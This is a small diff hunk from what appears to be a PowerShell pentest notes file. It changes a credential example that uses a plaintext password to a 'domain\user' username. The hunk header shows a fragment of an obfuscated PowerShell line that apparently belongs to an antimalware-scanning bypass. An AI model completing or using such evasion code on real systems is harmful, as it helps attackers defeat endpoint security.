@@ -42,7 +42,7 @@ sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) 
 `start powershell -credential ""`
 
 ```
-$username = 'user'
+$username = 'domain\user'
 $password = 'password'
 
 $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
